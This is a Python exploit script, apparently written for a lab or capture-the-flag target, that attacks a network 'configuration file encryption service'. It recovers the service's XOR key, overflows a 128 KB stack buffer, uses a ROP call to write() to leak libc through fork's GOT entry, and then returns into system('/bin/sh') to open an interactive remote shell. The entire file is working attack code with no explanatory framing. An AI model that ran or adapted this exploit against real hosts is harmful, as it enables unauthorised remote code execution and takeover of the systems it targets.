import struct
import socket
import telnetlib
import time

BANNER1 = "[-- Enterprise configuration file encryption service --]\n"
BANNER2 = "[-- encryption complete. please mention 474bd3ad-c65b-47ab-b041-602047ab8792 to support staff to retrieve your file --]\n"

def interact():
    global t
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def p(x):
    return struct.pack("<L", x)

def start_connection():
    print "[+] Connecting to remote host..."
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.1.80", 20002))
    s.recv(len(BANNER1))

def test_payload(key):
    payload = "A"*(131072 + 16) + p(0xdeadbeef)
    fin_payl = xor(payload, key)
    send_data(fin_payl)
    s.recv(2048)
    s.send("Q")

def send_data(data):
    cmd = "E"
    cmd += p(len(data))
    cmd += data
    s.send(cmd)

def get_xorkey():
    
    print "[+] Retrieving XOR key..."
    
    test = "\x00"*128
    send_data(test)

    time.sleep(1)
    
    s.recv(len(BANNER2))
    s.recv(1) 
    key_len = struct.unpack("<L", s.recv(4))[0]
    key_len
    key = s.recv(key_len)

    return key

def xor(msg, key):
    result = ""
    for i in range(0, len(msg)):
        result += chr(ord(msg[i]) ^ ord(key[i % 128]))
    return result

def test_xorkey(key):
    
    print "[+] Key retrieved, testing..."
    
    test = "B"*256
    send_data(test)
    
    s.recv(len(BANNER2))
    s.recv(1)                                   #newline
    ln = struct.unpack("<L", s.recv(4))[0]
    encrypted_test = s.recv(ln)
    
    final = xor(encrypted_test, key)
    
    if final == "B"*256:
        print "[+] XOR key found"
    
    elif final != "B"*256:
        print "[+] XOR key not found, exiting..."
        exit()

WRITE = 0x080489c0

FORKGOT = 0x0804b3f8

FORKBASE = 0x09b5c0

SYSTEMBASE = 0x03cb20

BINSH = 0x1388da

def exploit(key):

    #leak LIBC base
    print "[+] Leaking libc base address..."

    payload = "A"*(131072 + 16)
    payload += p(WRITE)
    payload += p(0xdeadbeef)
    payload += p(0x1)
    payload += p(FORKGOT)
    payload += p(0x4)

    ropchain = xor(payload, key)
    send_data(ropchain)
   
    time.sleep(1)

    s.recv(len(BANNER2))
    response_len = struct.unpack("<L", s.recv(4))[0]
    s.recv(response_len)
    s.send("Q")
    FORK = int(hex(struct.unpack("<L", s.recv(4))[0]), 16)
    libc_base =  FORK - FORKBASE
    system_addr = libc_base + SYSTEMBASE
    s.close()
    time.sleep(5)

    #final exploit
    print "[+] Tests done... running the exploit..."

    start_connection()
    new_key = get_xorkey()
    test_xorkey(new_key)
    
    expl = "A"*(131072 + 16)
    expl += p(system_addr)
    expl += p(0xdeadbeef)
    expl += p(libc_base + BINSH)
    
    exploit_code = xor(expl, new_key)
    send_data(exploit_code)

    time.sleep(1)
    
    s.recv(len(BANNER2))
    data_len = struct.unpack("<L", s.recv(4))[0]
    s.recv(response_len)
    s.send("Q")
    interact()

start_connection()
key = get_xorkey()
test_xorkey(key)
exploit(key)
